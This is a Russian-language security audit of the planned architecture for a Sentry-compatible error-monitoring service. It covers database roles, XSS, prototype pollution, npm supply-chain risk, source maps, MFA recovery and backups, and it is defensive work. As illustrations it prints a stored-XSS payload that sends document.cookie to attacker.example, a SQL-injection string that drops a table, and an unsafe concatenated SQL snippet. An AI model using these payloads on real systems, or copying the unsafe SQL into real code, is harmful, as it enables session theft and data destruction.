# Аудит безопасности Error Monitor

Дата проверки: 4 сентября 2026 года.

Этот документ проверяет архитектуру, описанную в [ADR-0001](./adr/0001-sentry-compatible-error-monitoring-platform.md), до начала реализации. Это аудит проектного решения, а не проверка готового кода и не penetration test. После появления приложения нужен повторный аудит исходного кода, Docker-конфигурации и production-сервера.

## Краткий вывод

Предложенную архитектуру можно реализовать безопасно. Публичный endpoint приёма ошибок сам по себе не обязан открывать ни PostgreSQL, ни личный кабинет, ни аккаунты конечных пользователей.

Главное условие: любое событие ошибки считается недоверенным от первой принятой строки до последнего места, где оно показывается человеку. Оно никогда не должно превращаться в SQL, HTML, JavaScript, путь к файлу, URL для серверного запроса или команду операционной системы.

Ответы на три главных вопроса:

1. **Можно ли через POST с ошибкой получить доступ к PostgreSQL?** Не через сам факт отправки и не специальной строкой внутри JSON. Это станет возможно только при отдельной уязвимости: склеенном из строк SQL, утёкшем пароле БД, открытом наружу порте PostgreSQL, выполнении кода в контейнере или слишком широких правах ingest.
2. **Можно ли сохранить вредоносный код в БД?** Сохранить строку вроде `<script>…</script>` злоумышленник сможет, если поле разрешено. Но строка должна остаться обычным текстом. Опасность возникает позже, если кабинет вставит её как HTML, Worker использует её как путь/команду или запрос к БД будет собран конкатенацией.
3. **Можно ли получить доступ к аккаунту пользователя наблюдаемого SPA?** Публичный DSN такого доступа не даёт. Наш штатный SDK не читает пароль или сессию приложения и отправляет запрос без cookie. Однако токен может утечь, если само приложение положит его в текст ошибки либо если будет скомпрометирован npm-пакет, который выполняется внутри страницы. Последний риск является одним из самых серьёзных.

После аудита добавлены обязательные меры, которых не хватало в исходной версии ADR:

- разные web-origin для личного кабинета и ingest;
- host-only cookie кабинета, которая физически не отправляется на ingest;
- точная матрица прав PostgreSQL и запрет небезопасного raw SQL;
- защита от stored XSS, prototype pollution, log injection, decompression/JSON bomb и второго порядка инъекций;
- изоляция обработки source maps;
- безопасное восстановление TOTP Owner без обхода второго фактора через одно письмо;
- усиленная защита публикации npm-пакета и CI;
- отдельные права на создание и чтение backup;
- набор обязательных негативных security-тестов.

## Как соответствующая часть устроена в Sentry

### Публичный DSN

В browser-приложении Sentry использует публичный DSN с project ID и public key. Актуальный Sentry API прямо возвращает отдельное поле `dsn.public`. Такой ключ нужен, чтобы выбрать проект и применить его настройки, но он не является секретом браузера и не доказывает, какой именно JavaScript отправил запрос.

Следствие одинаково для Sentry и Error Monitor: человек, который увидел DSN в bundle или DevTools, может сформировать собственное событие. Ни JWT, ни HMAC не решат это, если постоянный секрет положить в тот же SPA. Ограничивать этот риск нужно правом «только запись», allowed origins как фильтром, квотами, rate limit, заменой ключа и изоляцией приёмника.

### Отдельный слой приёма Relay

Основной вход событий в Sentry — отдельный сервис Relay. В официальной документации Relay перечислены приём web-запросов, rate limits, inbound filters, очистка персональных данных, проверка/нормализация формата и передача дальше в pipeline.

Наш `apps/ingest` выполняет ту же роль границы, но только для одного item типа `event` и гораздо меньшей схемы. Мы не копируем весь Relay: не нужны Kafka, Redis, tracing, replay, profiles, attachments и десятки протоколов. Это уменьшает площадь атаки, но не даёт автоматически многолетнюю зрелость Sentry; реализацию всё равно надо тестировать независимо.

### Очистка данных

Sentry умеет применять серверные правила data scrubbing, в том числе удалять IP, типовые пароли/карты и указанные поля. У Sentry это настраиваемая богатая схема. Для Error Monitor выбрано более строгое правило: сервер создаёт новый объект только из маленького разрешённого списка, а затем дополнительно маскирует похожие на секреты значения.

Это безопаснее для нашего узкого MVP, но не даёт абсолютной гарантии. Любая маскировка по шаблонам может не узнать необычно записанный или закодированный секрет. Поэтому основная защита — не собирать опасные источники данных и не передавать секреты в ошибки вообще.

### Source maps

Sentry загружает source maps из CI с секретным auth token и предупреждает, что публичная раздача `.map` может раскрыть исходный код. Error Monitor делает токен ещё уже: один проект и только upload. Сам source map всё равно считается конфиденциальным недоверенным файлом.

## Цепочка обработки недоверенного события

```text
Браузер или злоумышленник
  -> Caddy: TLS, timeout, сетевые лимиты, лимит тела
  -> ingest: DSN, origin-фильтр, квота, framing и строгая схема
  -> новый очищенный объект (исходный объект больше не используется)
  -> параметризованный INSERT под ограниченной ролью PostgreSQL
  -> Worker в изолированном контейнере
  -> типизированные поля события
  -> Dashboard API с проверкой роли и команды
  -> React text node; никогда не HTML
```

Нарушение одного слоя не должно сразу давать полный доступ. Например, XSS-фрагмент может пройти как сообщение, но React обязан показать символы `<` и `>` текстом. Даже если в ingest найдётся уязвимость выполнения кода, его роль PostgreSQL не должна уметь читать пользователей, сессии и события.

## Аудит доступа к PostgreSQL

### Почему SQL в тексте ошибки не выполняется

SQL injection появляется не потому, что в БД сохраняется подозрительная строка, а потому, что приложение смешивает эту строку с текстом SQL-команды.

Опасно:

```ts
`INSERT INTO error_event (message) VALUES ('${message}')`;
```

Безопасно по смыслу:

```ts
prisma.errorEvent.create({ data: { message } });
```

или параметризованный tagged template:

```ts
prisma.$queryRaw`SELECT ... WHERE project_id = ${projectId}`;
```

Во втором случае PostgreSQL получает команду и значение раздельно. Значение `'); DROP TABLE user; --` остаётся одной строкой, а не продолжением команды.

### Обязательные правила SQL

- обычные операции выполняются Prisma Client;
- `$queryRawUnsafe` и `$executeRawUnsafe` запрещены правилом code review и статической проверкой CI;
- `Prisma.raw(userInput)` и самостоятельно собранные из пользовательских строк tagged templates запрещены;
- необходимый `FOR UPDATE SKIP LOCKED` пишется как фиксированный параметризованный запрос;
- имена колонок, направление сортировки и таблицы никогда не берутся из запроса напрямую: они выбираются через серверный `switch` из короткого списка;
- миграции исполняются только отдельной ролью deploy, а не web/ingest/worker;
- все роли приложения имеют `NOSUPERUSER`, `NOCREATEDB`, `NOCREATEROLE`, `NOREPLICATION`, `NOBYPASSRLS`;
- у ролей заданы connection limit, `statement_timeout`, `lock_timeout` и `idle_in_transaction_session_timeout`;
- права схемы `PUBLIC` отзываются явно;
- пароли ролей разные, случайные и используют SCRAM-SHA-256.

### Матрица ролей PostgreSQL

| Роль БД                 | Может                                                                                                                  | Не может                                                                          |
| ----------------------- | ---------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------- |
| `error_monitor_migrate` | Применять проверенные миграции во время deploy                                                                         | Использоваться постоянно приложениями                                             |
| `error_monitor_ingest`  | Читать ограниченное представление активных project/key/origin/quota; вставлять только допустимые колонки `event_inbox` | Читать inbox, события, source maps, аккаунты, сессии; UPDATE/DELETE; менять схему |
| `error_monitor_worker`  | Забирать inbox, писать issue/error_event/stat, читать метаданные source maps                                           | Читать password/auth/session/invitation/recovery tables; менять схему             |
| `error_monitor_web`     | Работать с кабинетом, auth и проектами через серверные правила                                                         | Менять схему; становиться superuser; подключаться извне Docker network            |
| `error_monitor_backup`  | Только согласованный `pg_dump`                                                                                         | Менять данные и схему                                                             |

Роли должны быть созданы и проверены миграционным smoke test. Тест подключается каждой ролью и подтверждает не только разрешённые, но и запрещённые операции.

### Может ли ingest всё-таки добраться до данных

В нормальной конфигурации — нет:

- порт 5432 не публикуется на host и недоступен из интернета;
- ingest знает только свой пароль БД;
- его роль не имеет `SELECT` на события, участников, auth и sessions;
- события не содержат URL, по которым сервер автоматически ходит, поэтому payload не превращается в SSRF к внутренней сети;
- контейнер не получает Docker socket, host filesystem или секреты других процессов.

Остаточный риск остаётся при компрометации production host, Docker daemon или роли миграций. Контейнерные ограничения от владельца host не защищают. Поэтому host требует firewall, ограниченного SSH, своевременных обновлений, минимального числа операторов и шифрования диска/volume средствами инфраструктуры.

### Row-Level Security

PostgreSQL RLS полезен как дополнительный слой для разделения проектов, но не заменяет серверную авторизацию. В MVP его нельзя включать «для галочки»: владелец таблицы и `BYPASSRLS` обходят policy, а неверно установленный project context в pooled connection может создать новую ошибку доступа.

Решение для MVP:

- основная защита между процессами — разные роли, таблицы, views и `GRANT`;
- доступ Developer/Viewer — централизованный серверный scope `workspace + teams + project` в каждом repository method;
- межпроектные тесты выполняются для каждого dashboard endpoint;
- RLS вводится отдельным hardening-изменением только после прототипа транзакционного project context; web/worker при этом не могут быть владельцами таблиц и не получают `BYPASSRLS`.

## Аудит вредоносного payload

### Stored XSS: код сохраняется, а потом выполняется в кабинете

Пример сообщения:

```text
<img src=x onerror="fetch('https://attacker.example/?c='+document.cookie)">
```

PostgreSQL сохранит это как текст. Опасность появится, если UI вставит сообщение через `dangerouslySetInnerHTML`, `innerHTML`, небезопасный markdown renderer или URL из события попадёт в `href/src` без проверки.

Обязательная защита:

- все сообщения, tags, breadcrumbs, filename и function name показываются обычными React text nodes;
- `dangerouslySetInnerHTML`, HTML/markdown из события и runtime-компиляция шаблонов запрещены;
- syntax highlighter получает только текст и не возвращает непроверенный HTML;
- динамические ссылки строятся только из внутренних route ID, а не из присланного URL;
- API отвечает `Content-Type: application/json` и `X-Content-Type-Options: nosniff`;
- кабинет использует строгую CSP с nonce, без `unsafe-inline`, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'`;
- CSP является дополнительным слоем, а не заменой корректному выводу текста;
- E2E-тесты отправляют набор XSS payload и проверяют, что ни один обработчик не выполняется.

HttpOnly защищает чтение session cookie из JavaScript, но stored XSS всё равно может отправлять запросы от имени открытого участника. Поэтому XSS в кабинете считается критической уязвимостью.

### Prototype pollution и небезопасное копирование объектов

JSON может содержать ключи `__proto__`, `prototype` и `constructor`. Они становятся опасны при рекурсивном merge, `Object.assign`, spread в неподходящую структуру или передаче в уязвимую библиотеку.

Защита:

- Envelope разбирается в недоверенную временную структуру;
- ключи `__proto__`, `prototype` и `constructor` рекурсивно отклоняются;
- сервер не делает deep merge входного события с настройками;
- очищенное событие собирается вручную по allow-list в новую типизированную структуру;
- словари создаются без наследуемого прототипа либо преобразуются в массивы проверенных пар;
- вложенные объекты, не нужные MVP, полностью отбрасываются;
- parser и sanitizer покрываются property-based/fuzz тестами.

### JSON/decompression bomb и истощение CPU/памяти

Даже запрос меньше мегабайта может быть намеренно сложным: очень глубокая вложенность, тысячи ключей, огромные массивы, многократное сжатие или строки, запускающие медленное регулярное выражение.

Защита применяется до тяжёлой работы:

- Caddy ограничивает передаваемый размер, время чтения заголовков/тела и число одновременных соединений;
- ingest разрешает только документированный `Content-Type` и `Content-Encoding`;
- проверяются и сжатый, и распакованный размеры; неизвестное или вложенное сжатие отклоняется;
- глубина, число полей, элементы массивов и длина каждой строки ограничены;
- `received_at` назначает сервер и использует для квот/retention; присланное время допускается только в разумном окне, чтобы событие из «2099 года» не ломало списки и удаление;
- event ID, release, environment, Debug ID и fingerprint имеют строгий формат и ограниченную длину/кардинальность;
- пользователь не может задавать регулярные выражения;
- собственные правила маскировки работают только на уже укороченных строках и проходят ReDoS-тесты;
- обработка имеет timeout и memory/CPU limit контейнера;
- тяжёлая symbolication не выполняется в HTTP request ingest.

### Инъекция второго порядка

Даже безопасно сохранённая строка может стать опасной позже. Поэтому данные события запрещено использовать как:

- часть raw SQL;
- имя таблицы или направление `ORDER BY`;
- shell-команду или аргумент одной строкой;
- путь к файлу без нормализации и собственного server-generated имени;
- URL, который Worker должен скачать;
- шаблон регулярного выражения;
- имя HTTP-заголовка;
- HTML, CSS или JavaScript.

### Подмена логов

Сообщение с переводами строк или ANSI escape-последовательностями может нарисовать ложную строку в terminal log или скрыть следующую запись.

Защита:

- исходный payload вообще не логируется;
- технические причины отказа выбираются из enum, а не копируются из запроса;
- разрешённые короткие значения перед логированием удаляют control/ANSI characters;
- логи являются структурным JSON, каждый event — одной записью;
- HTTP access log не содержит query, Authorization, cookie, invitation token или тело.

## Может ли сервис раскрыть аккаунт наблюдаемого приложения

Под «аккаунтом, с которого отправляется ошибка» возможны два разных объекта. Их важно не смешивать.

### Аккаунт конечного пользователя в app/transport/x-editor

В штатном потоке Error Monitor не получает пароль пользователя и не получает возможность действовать в исходном приложении:

- DSN принадлежит проекту мониторинга, а не пользователю;
- запрос отправки не содержит Authorization;
- `fetch` использует `credentials: 'omit'` и `referrerPolicy: 'no-referrer'`;
- transport не использует `sendBeacon`, где сложнее гарантировать отсутствие credentials;
- cookie, localStorage, sessionStorage, тела/заголовки запросов, формы, Redux/state и DOM не читаются;
- `setUser` принимает только специально созданный opaque ID;
- ingest повторно отбрасывает запрещённые поля.

Для дополнительной физической развязки используются разные origins, например:

```text
https://monitor.example.com          личный кабинет
https://ingest.monitor.example.com   публичный приём ошибок
```

Session cookie Error Monitor имеет префикс `__Host-`, не содержит атрибута `Domain` и принадлежит только host кабинета. На host ingest cookie не создаются.

### Как токен исходного приложения всё же может утечь

1. Сам разработчик пишет `captureException(new Error('token=' + accessToken))`.
2. Backend возвращает токен внутри ошибки, а приложение копирует весь ответ в message/breadcrumb.
3. Токен присутствует в URL, а новый код снова разрешит query string.
4. В package включат более широкую Sentry integration, которая собирает лишний context.
5. Злоумышленник захватит публикацию `@sendsay/error-monitor-react` и выпустит версию, читающую localStorage или перехватывающую `fetch`.

Если в самом наблюдаемом SPA уже есть XSS или пользователь установил вредоносное расширение, такой код и без Error Monitor работает в контексте страницы и может читать всё, что не защищено HttpOnly/браузерной изоляцией. Monitoring не создаёт этот доступ и не способен исправить компрометацию исходного приложения.

Первые четыре риска снижают allow-list, маскирование и canary-тесты, но строковый scrubber принципиально не распознает секрет во всех возможных кодировках. Поэтому наблюдаемые SPA тоже должны соблюдать правила:

- не включать токены/пароли в `Error.message`, tags, user ID и breadcrumbs;
- по возможности хранить web-сессию в `Secure; HttpOnly; SameSite` cookie, а не в localStorage;
- использовать короткоживущие access tokens и отзыв refresh sessions;
- передавать в monitoring только server-generated безопасные коды ошибок;
- ограничить CSP `connect-src` известными API и Error Monitor;
- обновлять monitoring package осознанно, а не плавающим диапазоном без review.

### Компрометация npm-пакета — особый риск

Серверная очистка здесь не помогает: вредоносный пакет работает **до** границы Error Monitor, внутри страницы исходного приложения. Он может отправить украденные данные прямо злоумышленнику и вообще не обращаться к нашему серверу.

Обязательная защита публикации:

- npm trusted publishing/OIDC вместо постоянного publish token;
- protected `stable`, CODEOWNERS и минимум одно независимое approval для изменений SDK, release workflow и package contents;
- immutable lockfile и закреплённые по commit SHA CI Actions;
- минимальный список runtime dependencies и запрет install scripts без явного исключения;
- проверка `npm pack`/provenance/SBOM и установка опубликованного tarball в чистый fixture;
- отдельный job сравнивает разрешённый состав файлов и не допускает секреты;
- воспроизводимая сборка настолько, насколько позволяет toolchain;
- немедленная процедура deprecate/rotate/release при компрометации;
- приложения закрепляют проверенную версию и обновляют её через обычный review.

## Аудит аккаунтов личного кабинета Error Monitor

### Основные цепочки захвата

| Атака                                              | Защита                                                                                                           |
| -------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| Перебор/credential stuffing                        | Argon2id, rate limit по IP и account, нейтральный ответ, проверка известных скомпрометированных паролей          |
| Кража reset/invitation URL                         | Одноразовый короткий токен, хеш в БД, срок, немедленное погашение, отсутствие URL в логах и Referer              |
| Подмена Google callback                            | Authorization Code + PKCE, state, nonce, точные redirect URIs, проверка issuer/audience/signature/verified email |
| Небезопасное объединение Google и password account | Никакого автоматического linking по email; привязка из свежей подтверждённой сессии                              |
| Кража session cookie                               | `__Host-`, Secure, HttpOnly, SameSite, ротация, короткий idle timeout, абсолютный срок, отзыв                    |
| CSRF                                               | SameSite плюс серверная проверка Origin/CSRF token и Content-Type для изменения данных                           |
| IDOR/смена project ID                              | Проверка workspace, роли, membership и project relation на каждом серверном запросе                              |
| Stored XSS из события                              | Только текстовый вывод, CSP, no external scripts, негативные E2E-тесты                                           |
| Понижение последнего Owner                         | Запрещено транзакционным ограничением и тестом гонки                                                             |

Абсолютные ссылки приглашения, reset и OAuth callback строятся только из фиксированного production base URL. Заголовки `Host`, `Forwarded-Host` и параметр `returnTo` не могут выбрать произвольный домен; redirect target проходит allow-list. Поля `role`, `team`, `workspace` и `project` не принимаются из self-service профиля пользователя и назначаются только проверенной Owner-операцией.

### Восстановление TOTP Owner

Сброс TOTP только по доступу к email превратил бы почту в способ обойти обязательный второй фактор. Поэтому:

- обычный Owner использует одноразовый recovery-код;
- если есть другой активный Owner, reset требует его подтверждения и повторной проверки его TOTP;
- для единственного Owner используется отдельный длинный offline recovery secret, созданный при bootstrap и находящийся у оператора production, а не в email или БД открытым текстом;
- recovery secret хранится в БД только как hash, одноразовый и после применения заменяется;
- reset отзывает все сессии аккаунта, требует заново настроить TOTP и записывается в audit log;
- обычная служба поддержки или Developer не могут выключить TOTP Owner;
- перед production рекомендуется создать минимум двух Owner и проверить процедуру восстановления.

### Чувствительные изменения

Для смены email, привязки/отвязки Google, отключения TOTP, создания CI-токена, замены DSN, повышения до Owner и удаления проекта нужна свежая сессия: повторный пароль или Google-вход плюс TOTP, если он обязателен. После смены пароля, email, MFA, роли или membership старые сессии отзываются либо немедленно переоценивают права на сервере.

## Source maps и CI

### Возможные атаки

- path traversal через имя `../../…`;
- zip bomb или слишком большое число файлов;
- parser bug/OOM на специально созданном `.map`;
- подмена Debug ID и показ разработчику неправильного исходника;
- утечка upload token из лога или fork pull request;
- попадание `.map` в публичный SPA deploy;
- секрет, случайно зашитый в `sourcesContent`;
- shell injection через filename в CLI.

### Обязательная защита

- CI token существует только в защищённом environment и не передаётся workflow из fork;
- токен project-scoped, upload-only, показывается один раз, хранится как hash и ротируется;
- endpoint принимает только ожидаемые расширения и MIME после проверки содержимого;
- server-generated storage name не зависит от присланного пути;
- проверяются число файлов, размер каждого, общий compressed/uncompressed размер и checksum;
- Debug ID имеет строгий формат и уникален внутри проекта;
- публикация набора атомарна: частично проверенные карты не видны Worker;
- parser запускается в Worker без internet egress, root, shell и доступа к auth tables;
- container имеет memory/CPU/time limit; падение конкретного файла даёт controlled failure/dead letter;
- CLI использует filesystem/API вызовы или аргументный `spawn`, но не собирает shell command строкой;
- после успешной загрузки `.map` удаляются из публичного deploy artifact; закрытая CI-копия имеет короткий срок;
- source maps не доступны по dashboard API на скачивание в MVP.

## Сеть, Docker и secrets

### Разделение origins и cookie

Dashboard и ingest должны иметь разные origins и разные upstream в Caddy. Ingest не обслуживает страницы, auth callbacks или dashboard API. Dashboard host не принимает Sentry Envelope.

Это защищает от случайной отправки session cookie на публичный endpoint и позволяет задать разные CSP, CORS, timeouts и rate limits.

### Production-контейнеры

- только Caddy публикует 80/443;
- PostgreSQL слушает только закрытую Docker network и не имеет `ports:`;
- web, ingest и worker находятся в отдельных network segments настолько, насколько позволяет Compose;
- каждый контейнер non-root, `read_only`, с `cap_drop: [ALL]`, `no-new-privileges` и отдельным tmpfs;
- Docker socket, host root, SSH keys и каталоги других приложений не монтируются;
- source-map volume доступен только Worker и upload-компоненту, не ingest;
- ingest/worker не получают SMTP, Google, S3 и auth encryption secrets;
- образы запускаются по digest/SHA, сканируются и регулярно пересобираются с security patches;
- секреты не находятся в image layers, Git, CI output или клиентских env.

Docker уменьшает последствия взлома одного процесса, но не является границей против root/владельца production host.

В односерверном MVP PostgreSQL доступен только внутри изолированной Docker network. Если БД когда-либо выносится на другой host, подключение без проверки TLS-сертификата запрещено; это изменение требует отдельного review сетевой модели.

### Proxy и HTTP

- Caddy полностью заменяет клиентские `Forwarded`/`X-Forwarded-*`, а не дописывает к ним;
- HSTS включается после проверки доменов; TLS 1.2+;
- заголовки и тело имеют timeout и size limit;
- dashboard и ingest возвращают generic errors без stack trace, SQL и внутренних ID;
- ответы ingest не возвращают присланное событие и не различают лишними деталями «проект существует, ключ неверен»;
- CORS у ingest никогда не включает `Access-Control-Allow-Credentials`;
- для preflight разрешён только необходимый метод и короткий список headers;
- IP допускается только как краткоживущий технический сигнал rate limit; он не записывается в событие, audit log или постоянную статистику.

## Backup и данные на диске

Упрощённый backup остаётся приемлемым, потому что бизнес допускает потерю истории ошибок. Но конфиденциальность копии не может быть упрощена:

- dump шифруется локально аутентифицированным шифрованием до S3;
- ключ шифрования не хранится в S3 и передаётся только процессу конкретного backup job на время шифрования;
- runtime credential backup job имеет только право записать новый объект под уникальным именем и не может читать, перезаписывать или удалять старые копии; срок хранения применяет отдельная bucket lifecycle policy;
- чтение для restore выполняется отдельным credential, который не находится постоянно в production process;
- bucket закрыт, блокирует public access и по возможности использует versioning/object lock;
- checksum/signature проверяется до restore;
- restore выполняется в чистую БД, не поверх работающей, и после проверки переключается оператором;
- live PostgreSQL volume размещается на зашифрованном диске/volume инфраструктуры;
- три копии означают небольшой запас от поздно замеченной порчи; этот остаточный риск принят явно.

## Злоупотребление законными правами и реагирование

Owner по назначению может читать все проекты, менять ключи и удалять данные. Приложение не может технически защитить организацию от единственного полностью доверенного Owner или root-оператора сервера. Снижение риска: минимум полномочий у остальных ролей, два Owner вместо общего аккаунта, персональные сессии, повторное подтверждение чувствительных действий и audit log.

Audit log защищает от обычного изменения через приложение, но не является криптографическим доказательством против человека с прямым доступом к PostgreSQL/host. Если такая гарантия понадобится, журнал нужно отдельно выводить в append-only внешнее хранилище; для MVP это не требуется.

До production нужен короткий runbook реагирования:

- DSN скомпрометирован — выпустить новый, дать окну миграции истечь, отозвать старый и очистить ложные события;
- CI token скомпрометирован — отозвать, проверить все загруженные после подозрительной даты карты и повторно загрузить доверенный набор;
- dashboard account скомпрометирован — отозвать все сессии, сбросить password/MFA, проверить audit log и действия Owner;
- npm publishing скомпрометирован — остановить deploy/update, deprecate вредоносную версию, восстановить publishing trust, выпустить чистую версию и проверить приложения;
- DB/host скомпрометирован — изолировать сервер, ротировать все credentials/ключи, восстановить в чистой среде и считать доступные события/source maps раскрытыми;
- backup key скомпрометирован — ротировать ключ и credentials, создать новую цепочку копий и оценить, какие старые dump могли быть прочитаны.

## Что обязательно сделать до первого production

### Блокирует production

- реализовать разные origins для dashboard и ingest и проверить отсутствие cookie на ingest;
- применить и протестировать матрицу ролей PostgreSQL;
- запретить unsafe raw SQL и динамические query fragments из пользовательского ввода;
- завершить strict payload allow-list и corpus/fuzz tests;
- выполнить stored-XSS и межпроектные authorization E2E-тесты;
- изолировать source-map parser и проверить traversal/zip bomb/OOM cases;
- защитить npm trusted publishing, release environment и package provenance;
- реализовать безопасный Owner MFA recovery;
- настроить encrypted backup с отдельными write/restore credentials;
- провести ручной review production Compose/Caddy/firewall/secrets.

### Можно сделать после MVP как усиление

- PostgreSQL RLS после безопасного прототипа project context;
- внешний WAF/CDN, если реальные атаки или объём этого потребуют;
- аппаратные WebAuthn/passkeys вместо или вместе с TOTP;
- immutable object lock для backup, если его поддерживает выбранное S3;
- регулярный внешний penetration test;
- автоматический DAST в staging с carefully scoped test account.

## Обязательные security-тесты

### Ingest и база

- SQL payload во всех строковых полях сохраняется как текст и не меняет схему/данные;
- Prisma unsafe APIs отсутствуют в production source;
- роль ingest получает permission denied на `user`, `session`, `error_event`, `source_artifact` и schema changes;
- malformed Envelope, duplicate headers, extra event items и unknown content encodings отклоняются;
- слишком глубокий JSON, длинные строки, большие массивы и compression bomb отклоняются до исчерпания памяти;
- `__proto__`, `constructor`, `prototype` не меняют ни один объект приложения;
- Worker не делает DNS/HTTP request по URL из события;
- ответ и все логи не содержат payload/canary secret.

### Кабинет и auth

- XSS corpus во всех отображаемых полях не выполняется;
- `javascript:`/`data:` из payload не становится кликабельным URL;
- Viewer/Developer не получают чужой проект сменой ID, фильтра, cursor, export/debug route или server action;
- CSRF запрос с чужого origin не меняет данные;
- cookie dashboard не появляется в запросе ingest;
- Google callback с неверными state/nonce/issuer/audience/redirect отклоняется;
- автоматический account linking по совпавшему email невозможен;
- password reset отзывает сессии, но не отключает TOTP;
- Owner TOTP reset требует утверждённый recovery path;
- гонка двух запросов не может удалить/понизить последнего Owner.

### CI, npm и source maps

- fork PR не видит ни одного production secret;
- опубликованный npm tarball имеет ожидаемый состав, provenance и лицензию;
- fixture использует пакет из registry и отправляет только allow-listed данные;
- malicious filenames, symlinks, absolute paths, traversal и zip bomb не выходят из staging directory;
- `.map` отсутствуют в публичном deploy artifact после upload;
- отозванный CI token и DSN перестают работать без перезапуска;
- parser timeout/OOM одного artifact не останавливает всю очередь.

## Итоговая оценка

Сам публичный DSN не является каналом чтения. При корректной реализации он даёт злоумышленнику только ограниченную возможность отправить недоверенное событие. Доступ к PostgreSQL, аккаунту Error Monitor или аккаунту исходного SPA требует уже другой уязвимости.

Наиболее вероятный риск — случайная передача чувствительной строки в ошибке. Наиболее опасные риски — компрометация npm-пакета, stored XSS/ошибка авторизации кабинета и захват production host/секретов. Поэтому безопасность проекта нельзя сводить только к проверке DSN и защите от DDoS.

После внесённых требований архитектурный риск для внутреннего MVP оценивается как приемлемый при двух условиях:

1. все блокирующие меры и негативные тесты входят в критерии готовности, а не остаются рекомендациями;
2. перед production проводится повторный аудит фактического кода и развёртывания.
